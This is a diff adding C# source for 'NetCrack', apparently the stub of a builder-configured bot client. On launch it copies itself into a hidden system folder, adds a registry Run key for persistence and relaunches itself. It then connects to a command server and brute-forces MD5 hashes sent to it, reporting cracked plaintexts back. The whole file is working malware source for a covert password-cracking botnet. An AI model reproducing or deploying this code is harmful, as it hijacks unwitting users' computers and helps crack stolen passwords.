@@ -1,0 +1,1037 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Net;
+using System.Net.Sockets;
+using System.Threading;
+using System.IO;
+using System.Reflection;
+using Microsoft.Win32;
+using System.Windows.Forms;
+using System.Diagnostics;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+
+[assembly: AssemblyTitle("NetCrack")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyDescription("Cracker of all networks")]
+[assembly: AssemblyCompany("Cracker inc.")]
+[assembly: AssemblyProduct("Net Cracker")]
+[assembly: AssemblyCopyright("Cracker inc.")]
+[assembly: AssemblyTrademark("Cracker inc.")]
+
+/// <summary>
+/// Made By BahNahNah
+/// uid=2388291
+/// </summary>
+namespace Stub
+{
+    class StubCode
+    {
+        #region " Settings "
+
+        static string Connection = "[connectiondetails]";
+        static int port = [port];
+
+        static bool mutexEnabled = [mutexenabled];
+        static string mutex = "[mutex]";
+
+        static bool startipEnabled = [startupenabled];
+        static string startupFolderName = "[startupfoldername]";
+        static string StartupSubFolder = "[starupsubfolder]";
+        static string StartupExeName = "[startupexec]";
+
+        #endregion
+
+        static eSocket.Client _client;
+        static bool connected = false;
+        static List<int> HashBlock = new List<int>();
+        static string hashCharset = "";
+        static string block = "";
+
+
+		    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+			private struct PROCESS_INFORMATION
+			{
+				public IntPtr ProcessHandle;
+				public IntPtr ThreadHandle;
+				public uint ProcessId;
+				public uint ThreadId;
+			}
+ 
+			[StructLayout(LayoutKind.Sequential, Pack = 1)]
+			private struct STARTUP_INFORMATION
+			{
+				public uint Size;
+				public string Reserved1;
+				public string Desktop;
+				public string Title;
+				[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
+				public byte[] Misc;
+				public IntPtr Reserved2;
+				public IntPtr StdInput;
+				public IntPtr StdOutput;
+				public IntPtr StdError;
+			}
+		    [DllImport("kernel32.dll")]
+			private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);
+
+        [STAThread]
+        static void Main(string[] args)
+        {
+			
+            #region " Startup "
+
+            if(startipEnabled)
+            {
+                string startupFolderLocation = "";
+                string startupLocation = "";
+                switch(startupFolderName.ToLower())
+                {
+                    case "temp":
+                        startupFolderLocation = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp");
+                        break;
+                    case "programdata":
+                        startupFolderLocation = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
+                        break;
+                    default:
+                        startupFolderLocation = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                        break;
+                }
+                startupFolderLocation = Path.Combine(startupFolderLocation, StartupSubFolder);
+                startupLocation = Path.Combine(startupFolderLocation, StartupExeName + ".exe");
+                string CurrentLocation = Assembly.GetExecutingAssembly().Location;
+                if (CurrentLocation != startupLocation)
+                {
+                    try
+                    {
+                        DirectoryInfo di = new DirectoryInfo(startupFolderLocation);
+                        di.Create();
+                        di.Attributes = FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System;
+						if(!File.Exists(startupLocation))
+							File.Copy(CurrentLocation, startupLocation);
+                        Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue(StartupExeName, "\"" + startupLocation + "\"");
+                        FileInfo fi = new FileInfo(startupLocation);
+                        fi.Attributes = FileAttributes.Hidden | FileAttributes.System;
+                        //Process.Start(startupLocation);
+						STARTUP_INFORMATION SI = new STARTUP_INFORMATION();
+						PROCESS_INFORMATION PI = new PROCESS_INFORMATION();
+						CreateProcess(startupLocation, "", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref SI, ref PI);
+                        Environment.Exit(0);
+                    }
+                    catch(Exception ex)
+                    {
+                        Console.WriteLine(ex.Message);
+                    }
+                }
+            }
+
+            #endregion
+
+            #region " Mutex "
+            if (mutexEnabled)
+            {
+                Mutex m;
+                try
+                {
+                    m = Mutex.OpenExisting(mutex);
+                    Environment.Exit(0);
+                }
+                catch
+                {
+                    m = new Mutex(true, mutex);
+                }
+            }
+            #endregion
+
+            Console.WriteLine("NetCrack");
+            Console.WriteLine("BahNahNah");
+            Console.WriteLine("uid=2388291");
+
+            Connect();
+			/*
+            while(true)
+            {
+				Thread.Sleep(10000000);
+			}
+             * */
+			Application.Run();
+        }
+
+        static void Connect()
+        {
+            Console.WriteLine("Connecting...");
+            while (!connected)
+            {
+                _client = new eSocket.Client();
+                _client.DataRetrievedCallback += _client_DataRetrievedCallback;
+                _client.DisconnectCallback += _client_DisconnectCallback;
+                connected = _client.Connect(Connection, port);
+                if (!connected)
+                {
+                    Console.WriteLine("Failed to connect. Waiting 10 seconds...");
+                    Thread.Sleep(10000);
+                }
+            }
+            Console.WriteLine("Connected to server!");
+        }
+
+        static void _client_DisconnectCallback(eSocket.Client c, SocketError SE)
+        {
+            Console.WriteLine("Disconnected from server...");
+            connected = false;
+            Connect();
+        }
+
+        static void _client_DataRetrievedCallback(eSocket.Client c, eSocket.PacketStructure packet)
+        {
+            if(packet.Type == (ushort)Packet.PacketType.MD5Crack)
+            {
+                Packet.MD5Crack crack = new Packet.MD5Crack(packet.PacketBuffer);
+                Console.WriteLine("\n\nTrying to crack MD5 hash...");
+                Console.WriteLine("MD5: {0}", crack.MD5);
+                Console.WriteLine("Charset: {0}", crack.Charset);
+                Console.WriteLine("Block: {0}", crack.Block);
+                hashCharset = crack.Charset;
+                block = crack.Block;
+                if (CrackBlockFailed(crack.MD5))
+                    c.Send(new Packet.MD5BlockComplete(crack.MD5));
+            }
+            if(packet.Type == (ushort)Packet.PacketType.MD5FirstBlock)
+            {
+                Packet.MD5FirstBlock crack = new Packet.MD5FirstBlock(packet.PacketBuffer);
+                Console.WriteLine("\n\nTrying to crack MD5 hash...");
+                Console.WriteLine("MD5: {0}", crack.Hash);
+                Console.WriteLine("Charset: {0}", crack.Charset);
+                Console.WriteLine("Block: None (first)");
+                block = "";
+                hashCharset = crack.Charset;
+                if (CrackBlockFailed(crack.Hash))
+                    c.Send(new Packet.MD5BlockComplete(crack.Hash));
+            }
+        }
+
+        static bool CrackBlockFailed(string hash)
+        {
+            HashBlock.Clear();
+            while (true)
+            {
+                string crackPrefix = GetNextBlock();
+                string tryHash = crackPrefix + block;
+                if (HashMatch(tryHash, hash))
+                {
+                    _client.Send(new Packet.MD5Cracked(hash, tryHash));
+                    Console.WriteLine("Hash cracked!");
+                    return false;
+                }
+                if (crackPrefix == (hashCharset[hashCharset.Length - 1] + hashCharset[hashCharset.Length - 1] + hashCharset[hashCharset.Length - 1]).ToString())
+                    break;
+            }
+            Console.WriteLine("Block finished, hash not cracked.");
+            return true;
+        }
+
+        static bool HashMatch(string tr, string hash)
+        {
+            MD5 hasher = MD5.Create();
+            byte[] hashBytes = hasher.ComputeHash(Encoding.UTF8.GetBytes(tr));
+            StringBuilder sb = new StringBuilder();
+            foreach (byte b in hashBytes)
+                sb.Append(b.ToString("x2"));
+            return hash.ToLower() == sb.ToString();
+        }
+
+        static string GetNextBlock()
+        {
+            if(HashBlock.Count == 0)
+            {
+                HashBlock.Add(0);
+                return hashCharset[0].ToString();
+            }
+            StringBuilder sb = new StringBuilder();
+            foreach(int i in HashBlock)
+            {
+                if (i > hashCharset.Length - 1)
+                    continue;
+                sb.Append(hashCharset[i]);
+            }
+            HashBlock[0] += 1;
+            for(int i = 0; i < HashBlock.Count; i++)
+            {
+                if(HashBlock[i] == hashCharset.Length)
+                {
+                    if (i == HashBlock.Count - 1)
+                    {
+                        HashBlock[i] = 0;
+                        HashBlock.Add(0);
+                    }
+                    else
+                    {
+                        HashBlock[i + 1] += 1;
+                        HashBlock[i] = 0;
+                    }
+                }
+            }
+            return sb.ToString();
+        }
+    }
+
+public static class eSocket
+{
+    public class Client
+    {
+        public delegate void DataRetrievedDelegate(eSocket.Client c, PacketStructure packet);
+        public delegate void DisconnectDelegate(eSocket.Client c, SocketError SE);
+
+        #region " Global Variables "
+
+        Socket _cSock;
+        byte[] _buffer;
+        public event DataRetrievedDelegate DataRetrievedCallback;
+        public event DisconnectDelegate DisconnectCallback;
+
+        #endregion
+
+        #region " Properties "
+        public Socket NetworkSocket
+        {
+            get { return _cSock; }
+        }
+
+        #endregion
+
+        #region " Initilisation "
+
+        /// <summary>
+        /// Initilise client with a default buffer size of 1024
+        /// </summary>
+        public Client()
+        {
+            _buffer = new byte[1024];
+            _cSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        }
+
+        /// <summary>
+        /// Initilise client
+        /// </summary>
+        /// <param name="bufferSize">Largest packet size the client can retrieve</param>
+        public Client(int bufferSize)
+        {
+            _cSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            _buffer = new byte[bufferSize];
+        }
+
+        #endregion
+
+        #region " Client Sub-Classes "
+
+
+        #endregion
+
+        #region " Connection "
+
+        /// <summary>
+        /// Connect to a server
+        /// </summary>
+        /// <param name="IP">the ip of the server</param>
+        /// <param name="port">the port to connect to</param>
+        /// <returns></returns>
+        public bool Connect(string IP, int port)
+        {
+            try
+            {
+                _cSock.Connect(IP, port);
+                return BeginCallbacks();
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        /// <summary>
+        /// Connect to a server
+        /// </summary>
+        /// <param name="ip">ip of the server</param>
+        /// <param name="port">port to connect to</param>
+        /// <returns></returns>
+        public bool Connect(IPAddress ip, int port)
+        {
+            try
+            {
+                _cSock.Connect(ip, port);
+                return BeginCallbacks();
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        /// <summary>
+        /// Connect to a server
+        /// </summary>
+        /// <param name="ipPort">Endpoint of server to connect to</param>
+        /// <returns></returns>
+        public bool Connect(IPEndPoint ipPort)
+        {
+            try
+            {
+                _cSock.Connect(ipPort);
+                return BeginCallbacks();
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        #endregion
+
+        #region " Functions "
+
+        public bool Send(PacketStructure packet)
+        {
+            try
+            {
+                _cSock.Send(packet.PacketBuffer);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        #endregion
+
+        #region " Callbacks "
+        private bool BeginCallbacks()
+        {
+            SocketError SE;
+            _cSock.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, out SE, RetrieveCallback, null);
+            return SE == SocketError.Success;
+        }
+        private void RetrieveCallback(IAsyncResult AR)
+        {
+            try
+            {
+                _cSock.EndReceive(AR);
+                ushort PacketLength = PacketStructure.PacketLength(_buffer);
+                byte[] _Packet = new byte[PacketLength];
+                Buffer.BlockCopy(_buffer, 0, _Packet, 0, PacketLength);
+                if (DataRetrievedCallback != null)
+                    DataRetrievedCallback(this, new PacketStructure(_Packet));
+                SocketError SE;
+                _cSock.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, out SE, RetrieveCallback, null);
+                if (SE != SocketError.Success)
+                {
+                    if (DisconnectCallback != null)
+                        DisconnectCallback(null, SE);
+                }
+            }
+            catch
+            {
+                if (DisconnectCallback != null)
+                    DisconnectCallback(null, SocketError.NotConnected);
+            }
+        }
+
+        #endregion
+    }
+    public class Server
+    {
+        public delegate void DataRetrievedDelegate(eSockClient c, PacketStructure packet, PacketError er);
+        public delegate void DataRetrievedNotStructuredDelegate(eSockClient c, byte[] packet);
+        public delegate void DisconnectDelegate(eSockClient c, SocketError SE);
+        public delegate void ConnectionDelegate(eSockClient c);
+
+        #region " Global Variables "
+
+        Socket _Sock;
+        int clientBufferSize = 1024;
+        int _port;
+        bool _structured = true;
+        public event DataRetrievedDelegate DataRetrievedCallback;
+        public event DisconnectDelegate ClientDisconnectCallback;
+        public event ConnectionDelegate ClientConnectCallback;
+        public event DataRetrievedNotStructuredDelegate DataRetrievedNotStructured;
+
+        #endregion
+
+        #region " Properties "
+        public Socket NetworkSocket
+        {
+            get { return _Sock; }
+        }
+
+        #endregion
+
+        #region " Initilisation "
+        /// <summary>
+        /// Create a new server
+        /// </summary>
+        /// <param name="port">port to listen on</param>
+        /// <param name="bufferSize">size of packet buffer</param>
+        /// <param name="structured">True - Server will read all data as packetStructures; False - Data will be returned as a byte array (size of the buffer)</param>
+        public Server(int port, int bufferSize, bool structured)
+        {
+            clientBufferSize = bufferSize;
+            _Sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            _port = port;
+            _structured = structured;
+        }
+
+        public Server(int port)
+        {
+            clientBufferSize = 1024;
+            _Sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            _port = port;
+            _structured = true;
+        }
+
+        #endregion
+
+        #region " Server Sub-Classes "
+
+        public class eSockClient
+        {
+            private Socket cSock;
+            private byte[] _buffer;
+            private object _tag;
+
+            /// <summary>
+            /// Any extra data that is needed for the client can be stored in this object
+            /// </summary>
+            public object Tag
+            {
+                get { return _tag; }
+                set { _tag = value; }
+            }
+
+            /// <summary>
+            /// Change the size of the packetBuffer for this client
+            /// </summary>
+            /// <param name="size">new buffer size</param>
+            public void ResizeBuffer(int size)
+            {
+                _buffer = new byte[size];
+            }
+
+            public byte[] PacketBuffer
+            {
+                get { return _buffer; }
+                set { _buffer = value; }
+            }
+            public eSockClient(Socket c)
+            {
+                cSock = c;
+            }
+            public Socket NetworkSocket
+            {
+                get { return cSock; }
+            }
+
+            public bool Send(PacketStructure packet)
+            {
+                try
+                {
+                    cSock.Send(packet.PacketBuffer);
+                    return true;
+                }
+                catch
+                {
+                    return false;
+                }
+            }
+        }
+
+        public enum PacketError
+        {
+            Success,
+            SizeIncorrect
+        }
+
+        #endregion
+
+        #region " Listening "
+
+        /// <summary>
+        /// Start server listening with a default backlog of 5
+        /// </summary>
+        /// <returns></returns>
+        public bool Start()
+        {
+            try
+            {
+                _Sock.Bind(new IPEndPoint(IPAddress.Any, _port));
+                _Sock.Listen(5);
+                _Sock.BeginAccept(AcceptCallback, null);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        /// <summary>
+        /// Start server listening with a custom backlog
+        /// </summary>
+        /// <param name="Backlog">Server backlog</param>
+        /// <returns></returns>
+        public bool Start(int Backlog)
+        {
+            try
+            {
+                _Sock.Bind(new IPEndPoint(IPAddress.Any, _port));
+                _Sock.Listen(Backlog);
+                _Sock.BeginAccept(AcceptCallback, null);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        #endregion
+
+        #region " Functions "
+
+
+
+        #endregion
+
+        #region " Callback "
+
+        private void AcceptCallback(IAsyncResult AR)
+        {
+            Socket cSock = _Sock.EndAccept(AR);
+
+            if (ClientConnectCallback != null)
+                ClientConnectCallback(new eSockClient(cSock));
+            SocketError SE;
+            eSockClient client = new eSockClient(cSock);
+            client.ResizeBuffer(clientBufferSize);
+            cSock.BeginReceive(client.PacketBuffer, 0, client.PacketBuffer.Length, SocketFlags.None, out SE, RetrieveCallback, client);
+            if (SE != SocketError.Success)
+            {
+                if (ClientDisconnectCallback != null)
+                    ClientDisconnectCallback(new eSockClient(cSock), SE);
+            }
+            _Sock.BeginAccept(AcceptCallback, null);
+        }
+
+        private void RetrieveCallback(IAsyncResult AR)
+        {
+            SocketError SE = SocketError.NotConnected;
+            eSockClient client = (eSockClient)AR.AsyncState;
+            try
+            {
+                client.NetworkSocket.EndReceive(AR, out SE);
+                if (SE != SocketError.Success)
+                    throw new Exception("Socket Error");
+
+                if (_structured)
+                {
+                    try
+                    {
+                        ushort packSize = PacketStructure.PacketLength(client.PacketBuffer);
+                        byte[] _packet = new byte[packSize];
+                        Buffer.BlockCopy(client.PacketBuffer, 0, _packet, 0, _packet.Length);
+                        PacketStructure ps = new PacketStructure(_packet);
+                        if (DataRetrievedCallback != null)
+                            DataRetrievedCallback(client, ps, PacketError.Success);
+                    }
+                    catch
+                    {
+                        if (DataRetrievedCallback != null)
+                            DataRetrievedCallback(client, new PacketStructure(4, 0), PacketError.SizeIncorrect);
+                    }
+                }
+                else
+                {
+                    if (DataRetrievedNotStructured != null)
+                        DataRetrievedNotStructured(client, client.PacketBuffer);
+                }
+
+                client.NetworkSocket.BeginReceive(client.PacketBuffer, 0, client.PacketBuffer.Length, SocketFlags.None, out SE, RetrieveCallback, client);
+                if (SE != SocketError.Success)
+                    throw new Exception("Socket Error");
+            }
+            catch
+            {
+                if (ClientDisconnectCallback != null)
+                    ClientDisconnectCallback(client, SE);
+            }
+        }
+
+        #endregion
+
+    }
+
+    #region " Packet "
+
+    /// <summary>
+    /// Writes packets.
+    /// </summary>
+    public abstract class PacketWriter
+    {
+        #region " Initilisation "
+
+        private byte[] _packetBuffer;
+        /// <summary>
+        /// Creates an empty packet
+        /// </summary>
+        /// <param name="size">size of buffer</param>
+        public PacketWriter(int size)
+        {
+            _packetBuffer = new byte[size];
+        }
+        public PacketWriter(byte[] pack)
+        {
+            _packetBuffer = pack;
+        }
+
+        #endregion
+
+        #region " Properties "
+        /// <summary>
+        /// Current buffer length
+        /// </summary>
+        public int Length
+        {
+            get { return _packetBuffer.Length; }
+        }
+        /// <summary>
+        /// Current buffer bytes
+        /// </summary>
+        public byte[] PacketBuffer
+        {
+            get { return _packetBuffer; }
+            private set { _packetBuffer = value; }
+        }
+
+        #endregion
+
+        #region " uShort "
+        /// <summary>
+        /// Read a ushort (2 bytes) from the packetBuffer
+        /// </summary>
+        /// <param name="offset">Byte offset to read value</param>
+        /// <returns></returns>
+        public ushort ReadUShort(int offset)
+        {
+            return BitConverter.ToUInt16(_packetBuffer, offset);
+        }
+        /// <summary>
+        /// Write a ushort (2 bytes) into the packetBuffer
+        /// </summary>
+        /// <param name="value">value to write into the buffer</param>
+        /// <param name="offset">byte offset to write the value</param>
+        public void WriteUShort(int offset, ushort value)
+        {
+            byte[] tBuff = BitConverter.GetBytes(value);
+            Buffer.BlockCopy(tBuff, 0, _packetBuffer, offset, sizeof(ushort));
+        }
+
+        #endregion
+
+        #region " Integer "
+        /// <summary>
+        /// Read an integer (4 bytes) from the packetBuffer
+        /// </summary>
+        /// <param name="offset">Byte offset to start reading</param>
+        /// <returns></returns>
+        public int ReadInteger(int offset)
+        {
+            return BitConverter.ToInt32(_packetBuffer, offset);
+        }
+        /// <summary>
+        /// Write an integer (4 bytes) to the packetBuffer
+        /// </summary>
+        /// <param name="offset">Byte offset to start writing</param>
+        /// <param name="value">Value to write to the buffer</param>
+        public void WriteInteger(int offset, int value)
+        {
+            byte[] tBuff = BitConverter.GetBytes(value);
+            Buffer.BlockCopy(tBuff, 0, _packetBuffer, offset, sizeof(int));
+        }
+
+        #endregion
+
+        #region " String "
+        /// <summary>
+        /// Read a string from the packetBuffer
+        /// </summary>
+        /// <param name="offset">Byte offset to start reading the string</param>
+        /// <param name="length">Number of bytes to read</param>
+        /// <param name="enc">Encoding of the string</param>
+        /// <returns></returns>
+        public string ReadString(int offset, int length, Encoding enc)
+        {
+            return enc.GetString(_packetBuffer, offset, length);
+        }
+        /// <summary>
+        /// Write a string to the packetBuffer
+        /// </summary>
+        /// <param name="offset">Byte offset to start writing the value</param>
+        /// <param name="value">String to write</param>
+        /// <param name="enc">Encoding to use</param>
+        public void WriteString(int offset, string value, Encoding enc)
+        {
+            byte[] tBuff = enc.GetBytes(value);
+            Buffer.BlockCopy(tBuff, 0, _packetBuffer, offset, tBuff.Length);
+        }
+
+        #endregion
+
+        #region " Byte Array "
+        /// <summary>
+        /// Read a byte array from the packetPuffer
+        /// </summary>
+        /// <param name="offset">Byte offset to begin reading</param>
+        /// <param name="length">Number of bytes to read</param>
+        /// <returns></returns>
+        public byte[] ReadBytes(int offset, int length)
+        {
+            byte[] tBuff = new byte[length];
+            Buffer.BlockCopy(_packetBuffer, offset, tBuff, 0, tBuff.Length);
+            return tBuff;
+        }
+        /// <summary>
+        /// Write a byte array to the packetBuffer
+        /// </summary>
+        /// <param name="offset">Byte offset to start writing</param>
+        /// <param name="value">Bytes to write to the buffer</param>
+        public void WriteBytes(int offset, byte[] value)
+        {
+            Buffer.BlockCopy(value, 0, _packetBuffer, offset, value.Length);
+        }
+        #endregion
+    }
+
+    /// <summary>
+    /// The base class for packets;
+    /// The 4 first bytes are reserved;
+    /// 0-2 - Length of the packet;
+    /// 2-4 - Packet id
+    /// </summary>
+    public class PacketStructure : PacketWriter
+    {
+        #region " Initilisation "
+
+        /// <summary>
+        /// Initilise an empty packet
+        /// </summary>
+        /// <param name="length">length of the packet (Excluding headers), So the atcual size will be length + 4</param>
+        /// <param name="type">the packet id</param>
+        public PacketStructure(int length, ushort type)
+            : base(length + 4)
+        {
+            WriteUShort(0, (ushort)Length);
+            WriteUShort(2, type);
+        }
+
+        /// <summary>
+        /// Load a packet into a packet structure
+        /// </summary>
+        /// <param name="packet"></param>
+        public PacketStructure(byte[] packet)
+            : base(packet)
+        {
+
+        }
+
+        #endregion
+
+        #region " Properties "
+
+        public ushort Type
+        {
+            get { return ReadUShort(2); }
+        }
+
+        #endregion
+
+        #region " Functions "
+
+        /// <summary>
+        /// Writes the string to the PacketStructure
+        /// </summary>
+        /// <param name="value">value to write</param>
+        /// <param name="enc">Encoding to use on the string</param>
+        public void WriteStringStructured(string value, Encoding enc)
+        {
+            WriteString(4, value, enc);
+        }
+
+        /// <summary>
+        /// Reads all the data in the packet as a string
+        /// </summary>
+        /// <param name="enc">Encoding to read string as</param>
+        /// <returns></returns>
+        public string ReadStringStructured(Encoding enc)
+        {
+            return ReadString(4, Length - 4, enc);
+        }
+
+        /// <summary>
+        /// Write bytes to a packetStructure
+        /// </summary>
+        /// <param name="pl"></param>
+        public void WriteBytesStructured(byte[] pl)
+        {
+            WriteBytes(4, pl);
+        }
+
+        /// <summary>
+        /// Reads all packetStructure data as bytes
+        /// </summary>
+        /// <returns></returns>
+        public byte[] ReadBytesStructured()
+        {
+            return ReadBytes(4, Length - 4);
+        }
+        #endregion
+
+        #region " Static Functions "
+        /// <summary>
+        /// Must be a packet structure
+        /// Reads the packet header and returns the length
+        /// </summary>
+        /// <param name="Packet">PacketStructure packet to read</param>
+        /// <returns></returns>
+        public static ushort PacketLength(byte[] Packet)
+        {
+            return BitConverter.ToUInt16(Packet, 0);
+        }
+        /// <summary>
+        /// Must be a packet structure
+        /// Reads the packet header and returns the packet id
+        /// </summary>
+        /// <param name="Packet"></param>
+        /// <returns></returns>
+        public static ushort PacketType(byte[] Packet)
+        {
+            return BitConverter.ToUInt16(Packet, 4);
+        }
+        #endregion
+    }
+
+    public class EmptyPacket : PacketWriter
+    {
+        /// <summary>
+        /// Creates an empty packet
+        /// </summary>
+        /// <param name="length">Length of the packet</param>
+        public EmptyPacket(int length)
+            : base(length)
+        {
+
+        }
+    }
+
+    #endregion
+}
+public class Packet
+    {
+        public class MD5Crack : eSocket.PacketStructure
+        {
+            public MD5Crack(string md5, string block, string charset)
+                : base((ushort)(md5.Length + block.Length + charset.Length + 2), (ushort)Packet.PacketType.MD5Crack)
+            {
+                WriteUShort(4, (ushort)charset.Length);
+                WriteString(6, md5, Encoding.UTF8);
+                WriteString(38, block, Encoding.UTF8);
+                WriteString(38 + block.Length, charset, Encoding.UTF8);
+            }
+            public MD5Crack(byte[] pack)
+                :base(pack)
+            { }
+            public string MD5
+            {
+                get { return ReadString(6, 32, Encoding.UTF8); }
+            }
+            public string Block
+            {
+                get { return ReadString(38, Length - CharsetLength - 38, Encoding.UTF8); }
+            }
+            public string Charset
+            {
+                get { return ReadString(Length - CharsetLength, CharsetLength, Encoding.UTF8); }
+            }
+            public ushort CharsetLength
+            {
+                get { return ReadUShort(4); }
+            }
+        } //MD5BlockComplete
+        public class MD5BlockComplete : eSocket.PacketStructure
+        {
+            public MD5BlockComplete(string hash)
+                : base(hash.Length, (ushort)Packet.PacketType.MD5BlockComplete)
+            {
+                WriteString(4, hash, Encoding.UTF8);
+            }
+            public MD5BlockComplete(byte[] pack)
+                :base(pack)
+            { }
+            public string MD5
+            {
+                get { return ReadString(4, 32, Encoding.UTF8); }
+            }
+        }
+        public class MD5Cracked : eSocket.PacketStructure
+        {
+            public MD5Cracked(string hash, string responce)
+                : base(hash.Length + responce.Length, (ushort)Packet.PacketType.MD5Cracked)
+            {
+                WriteString(4, hash, Encoding.UTF8);
+                WriteString(hash.Length + 4, responce, Encoding.UTF8);
+            }
+            public MD5Cracked(byte[] pack)
+                : base(pack)
+            { }
+            public string MD5
+            {
+                get { return ReadString(4, 32, Encoding.UTF8); }
+            }
+            public string Output
+            {
+                get { return ReadString(36, Length - 36, Encoding.UTF8); }
+            }
+        }
+        public class MD5FirstBlock : eSocket.PacketStructure
+        {
+            public MD5FirstBlock(string hash, string charset)
+                :base((ushort)(hash.Length + charset.Length), (ushort)Packet.PacketType.MD5FirstBlock)
+            {
+                WriteString(4, hash, Encoding.UTF8);
+                WriteString(36, charset, Encoding.UTF8);
+            }
+            public MD5FirstBlock(byte[] pack)
+                :base(pack)
+            { }
+            public string Hash
+            {
+                get { return ReadString(4, 32, Encoding.UTF8); }
+            }
+            public string Charset
+            {
+                get { return ReadString(36, Length - 36, Encoding.UTF8); }
+            }
+        }
+
+        public enum PacketType
+        {
+            MD5Crack,
+            MD5BlockComplete,
+            MD5Cracked,
+            MD5FirstBlock
+        }
+    }
+
+
+}
